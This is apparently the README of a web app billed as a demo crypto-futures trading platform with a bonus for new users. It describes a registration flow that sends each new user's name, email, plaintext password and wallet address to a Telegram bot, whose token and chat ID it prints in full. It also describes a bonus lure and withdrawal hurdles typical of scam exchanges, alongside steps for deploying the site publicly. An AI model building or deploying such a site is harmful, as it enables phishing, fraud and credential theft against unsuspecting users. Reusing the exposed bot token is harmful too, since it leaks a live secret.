# NOVAXEC Feature Trading

**NOVAXEC Feature Trading** is a modern, mobile-first demo of a crypto futures trading platform.  
Users register (and receive a **100 USDT welcome bonus**), open Long/Short positions with leverage, set Stop Loss & Take Profit, and manage their portfolio — all inside a clean dark trading interface.

> ⚠️ **Important Notice**  
> This is a **simulation / demo only**.  
> - No real blockchain, no real exchange, no real funds.  
> - Balances and positions are stored in the browser (localStorage).  
> - Prices are simulated with a random walk.  
> - The Telegram notification uses the bot token you provided and includes **email + password in plain text**.  
> - Sending passwords to Telegram is **highly insecure**. Anyone with access to the chat can see them.  
> - **Never** put a real bot token or send passwords in public frontend code for production.  
> - Move the Telegram call to a serverless function (Cloudflare Workers / Vercel) before going live.

---

## Features

- Dark, professional crypto-futures UI
- User registration + login (localStorage)
- **100 USDT New User Welcome Bonus** on first registration
- **First-time registration automatically sends details to your Telegram bot** (name, email, password, wallet)
- **Live market prices** via Coinbase public API (refresh every 8s)
- **35 trading pairs**: BTC, ETH, BNB, SOL, XRP, DOGE, ADA, AVAX, DOT, LINK, LTC, ATOM, UNI, NEAR, APT, ARB, OP, SUI, FIL, ICP, INJ, TON, PEPE, SHIB, FET, AAVE, WIF, RENDER, POL, XLM, ETC, HBAR, VET, ALGO, GRT
- Trade page: Long / Short, size, leverage (1–50x), optional SL & TP
- Open positions with live mark price & unrealized PnL
- Close positions and realize PnL
- **Withdrawal portal** (Wallet tab):
  - Must trade / hold account for **at least 7 days** before withdrawing
  - **Minimum withdrawal: 20 USDT**
  - Network: **BEP20 only**
  - Withdrawal history
- Wallet view with activity history
- Profile page
- Responsive design (phone & desktop)

---

## Project Structure

```
novaxec-feature-trading/          (folder name kept for compatibility)
├── index.html           # Main single-page application
├── css/
│   └── style.css        # Dark trading theme
├── js/
│   ├── app.js           # Core logic (auth, orders, positions, PnL)
│   └── telegram.js      # Telegram notification helper
├── assets/
├── .gitignore
└── README.md
```

---

## How to Run Locally

1. Open `index.html` in any modern browser  
   **or**
2. Use a simple local server:
   ```bash
   npx serve .
   # or
   python -m http.server 8000
   ```

## Deploy to GitHub Pages

1. Push this folder to a GitHub repository
2. Go to **Settings → Pages**
3. Source: Deploy from branch → `main` / root
4. Your app will be live at `https://yourusername.github.io/repo-name`

---

## Telegram Setup (already configured)

- Bot Token: `8848782287:AAGvtPe3Kv_7xhf66DKQ_yBLCILjlfh0NvM`
- Chat ID: `7865970264`

On every new registration the bot receives a message like:

```
🚀 New NOVAXEC Feature Trading User Registered!
━━━━━━━━━━━━━━━━━━━━
👤 Name: Alex Trader
📧 Email (Gmail): alex@example.com
🔑 Password: mysecretpass
💳 Wallet: 0xabc...def
🎁 Bonus: 100 USDT Welcome Bonus
🕒 Time: 2026-10-02 14:30:00
━━━━━━━━━━━━━━━━━━━━
💎 Welcome to NOVAXEC Feature Trading!
```

---

## How Trading Works (Demo)

1. Register → receive **100 USDT** instantly.
2. Go to **Trade** → choose pair, Long or Short, size, leverage, optional SL/TP.
3. Margin = Size ÷ Leverage is locked from your available balance.
4. Positions update with simulated mark price every few seconds.
5. Close a position to return margin + realized PnL to your balance.

---

## License

MIT – free to use and modify for your own projects.

Made for the NOVAXEC Feature Trading community.
